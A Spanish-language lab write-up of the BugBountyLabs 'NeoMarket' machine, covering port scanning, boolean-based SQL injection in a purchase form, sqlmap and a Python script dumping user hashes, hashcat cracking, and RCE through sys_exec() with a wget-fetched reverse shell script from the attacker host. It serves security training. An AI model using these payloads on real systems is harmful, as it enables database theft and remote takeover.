---
title: "NeoMarket"
date: 2025-03-19 21:36:14 +0100
categories: writeups bugbountylabs
tags: máquina linux inyecciónsql rce mine
description: Writeup de la máquina NeoMarket de BugBountyLabs.
image: ../assets/images/posts/logos/bugbountylabs.jpeg
---
## Resumen de la resolución

**NeoMarket** es una máquina **Linux** de dificultad **Media (Avanzado)** de la plataforma **BugBountyLabs**. En ella explotaremos una **Inyección SQL**, tanto de manera automatizada como manual, que se presenta al intentar comprar un nuevo artículo. Tras enumerar la base de datos, no veremos nada interesante de lo que podamos abusar, por lo que deberemos darnos cuenta de que podemos ejecutar comandos remotamente (**RCE**) gracias al uso de la función `sys_exec()`. Finalmente, ganaremos acceso a la máquina víctima y leeremos el contenido del archivo `flag.txt` necesario para completar el formulario.

___
## Enumeración

En primer lugar, realizaremos un barrido en la red para encontrar la **Dirección IP** de la máquina víctima, para ello usaremos el siguiente comando.

```bash
arp-scan -I ens33 --localnet
```

A continuación podemos ver la **Dirección IP**  ya que el **OUI** es **08:00:27**, correspondiente a una máquina virtual de **Virtual Box**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223143538.png>)

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 192.168.26.82 -oG allPorts
```

Observamos como nos reporta que se encuentra abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144031.png>)

Ahora gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 --open --min-rate 5000 -sS -v -Pn -n 192.168.26.82 -oG allPorts
```

En el segundo escaneo de **Nmap** lo que más nos llamará es la existencia del dominio **neomarket.bbl**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144133.png>)

___
### Puerto 80 - HTTP (Apache)

El aspecto de la página web alojada en el puerto **80**, es el siguiente.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144158.png>)

Registraremos un nuevo usuario (**trr0r**) desde el panel de **Register**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144357.png>)

Nos logearemos con dicho usuario.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144410.png>)

Añadiremos un nuevo artículo.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144655.png>)

Finalmente, para terminar el tour por la aplicación web, comprobaremos un artículo, el que habíamos añadido.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144811.png>)

___
## Explotación
### SQL Inyection → RCE

Gracias al uso de **FoxyProxy** y **BurpSuite** capturaremos la petición de comprar un artículo. Modificaremos la petición añadiéndole una comilla (`'`).

```java
id=1'&cantidad=1&buy_articulo=Comprar
```

Veremos que nos devuelve un **500 Internal Server Error**, por lo que seguramente sea vulnerable a una **SQL Inyection**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223144947.png>)

Probaremos con una típica **SQL Inyection**, que nos sirve para hacer que la consulta SQL sea verdadera.

```java
id=1' and 1=1-- -&cantidad=1&buy_articulo=Comprar
```

En la respuesta de la petición, veremos que nos aparece un mensaje exitoso (**Artículo comprado correctamente**).

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223145131.png>)

Ahora probaremos con el siguiente payload, que establece la consulta SQL a falso.

```java
id=1' and 1=2-- -&cantidad=1&buy_articulo=Comprar
```

Como podemos ver en la siguiente captura, no aparece ningún mensaje, ya que la consulta SQL es falsa. Podemos concluir que es vulnerable a una **Inyección SQL basada en booleanos**

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223145114.png>)
#### Automated - SQLMap

En primer lugar, estaremos dumpeando la información de la base de datos de manera automatizada gracias a **SQLMap**.
##### Bases de datos

Guardaremos en un fichero la petición vulnerable a la **Inyección SQL basada en booleanos**, y a continuación usaremos el siguiente comando para sacar todas las bases de datos.

```bash
sqlmap -r req.req -p "id" --dbs --batch --level 5 --risk 3
```

Entre todas las bases de datos que nos reporta nos llamará la atención **shop**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250318142329.png>)
##### Tables de la base de datos shop

Mostraremos todas las tablas de la base de datos **shop** gracias al siguiente comando.

```bash
sqlmap -r req.req -p "id" -D shop --tables --batch --level 5 --risk 3
```

Nos llamará la atención la tabla **users**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250318142517.png>)
##### Columnas de la tabla users

Gracias a la siguiente instrucción mostraremos las columnas de la tabla **users**.

```bash
sqlmap -r req.req -p "id" -D shop -T users --columns --batch --level 5 --risk 3
```

Nos quedaremos con la columna **password** y **username**.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250318143350.png>)
##### Información de la tabla users

Finalmente, dumpearemos la información de la tabla **users** gracias al siguiente comando.

```bash
sqlmap -r req.req -p "id" -D shop -T users -C username,password --dump --batch --level 5 --risk 3
```

Tal y como vemos a continuación, encontraremos dos hashes: el nuestro y el del usuario **admin**. En este punto, procederemos a crackear el **hash** de dicho usuario: **Cracking admin hash**

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250318145446.png>)

#### Manual - Python Script

Gracias al siguiente script, seremos capaces de volcar toda la información de la base de datos, es decir, obtener el **hash** del usuario **admin**. 

```python
#!/usr/bin/env python3

# Author: Álvaro Bernal (aka. trr0r)

import requests, string, time, signal, sys
from pwn import *

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_:,$.@/~1&*"

main_url = "http://neomarket.bbl/compras.php"

# Establecemos la cookie de sesión de nuestro usuario
cookies = {
    'PHPSESSID' : 'sv1ra931u11dc765ec5co2i41m'
}

# Payloads usados para dumpear la información de la base de datos
# databases = "111' or substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s'-- -" % (position, character)
# shop's tables = "111' or substring((select group_concat(table_name) from information_schema.tables where table_schema='shop'),%d,1)='%s'-- -" % (position, character)
# columns users = "111' or substring((select group_concat(column_name) from information_schema.columns where table_schema='shop' and table_name = 'users'),%d,1)='%s'-- -" % (position, character)
# users's information = "111' or substring((select group_concat(BINARY(username),0x3a,BINARY(password)) from shop.users),%d,1)='%s'-- -" % (position, character)

def ctrl_c(key, event):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def makeSQLI():

    cadena = ""
    p1 = log.progress("SQLI")
    p1.status("Fuerza bruta")
    p2 = log.progress("Información extraída")
    
    for position in range(1, 100):
        for character in characters:
        
            data = {
                'id' : "111' or substring((select group_concat(BINARY(username),0x3a,BINARY(password)) from shop.users),%d,1)='%s'-- -" % (position, character),
                'cantidad' : '1',
                'buy_articulo' : 'Comprar'
            }
            
            r = requests.post(main_url, data=data, cookies=cookies, allow_redirects=False)
            p1.status(data["id"])
            
            if r.status_code == 302:
                cadena += character
                p2.status(cadena)
                break

if __name__ == '__main__':
    makeSQLI()
```

Al ejecutar el script anterior, podremos volcar la información de la tabla **users**, donde encontraremos dos hashes: el nuestro y el del usuario **admin**. En este punto, procederemos a crackear el **hash** de dicho usuario: **Cracking admin hash**

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250318141852.png>)
### Cracking admin hash

Para crackear el hash del usuario **admin**, ejecutaremos el siguiente comando indicando el modo de **hash** (**3200**).

```bash
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
```

Veremos que la contraseña para el usuario **admin** es **speaker**. Cabe destacar que, aunque nos logueemos usando estas credenciales, no vamos a conseguir nada con esto.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250318140549.png>)
### RCE

Tras enumerar la base de datos y ver que no hemos encontrado nada, nos daremos cuenta de que el punto de entrada es a través del siguiente payload, que abusa de la función `sys_exec()`.

```java
id=1' union select 1,2,sys_exec("ping -c 1 192.168.26.10")-- -&cantidad=1&buy_articulo=Comprar
```

Tras habernos puesto previamente en escucha de paquetes **ICMP**, veremos que recibimos un `ping` de la máquina víctima.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223145310.png>)

Una vez que hemos comprobado que tenemos ejecución remota de comandos (**RCE**), nos enviaremos una **Reverse Shell**. En primer lugar, nos pondremos en escucha con **NetCat** (`nc -nlvp 443`) y como `curl` no está instalado, debemos de enviarnos la **Reverse Shell** con `wget` o con un `base64 -d`. En definitiva, debemos de ejecutar el siguiente payload.

```java
id=1' union select 1,2,sys_exec("wget 192.168.26.10/rev.sh -O /tmp/rev.sh; chmod 777 /tmp/rev.sh; /tmp/rev.sh")-- -&cantidad=1&buy_articulo=Comprar
```

Tal y como vemos a continuación, recibimos correctamente la **Reverse Shell**, por lo que habremos ganado acceso a la máquina víctima.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223145648.png>)

Finalmente, lo que debemos de hacer es leer la `flag.txt`.

![](<../assets/images/posts/2025-03-19-neomarket/Pasted image 20250223145731.png>)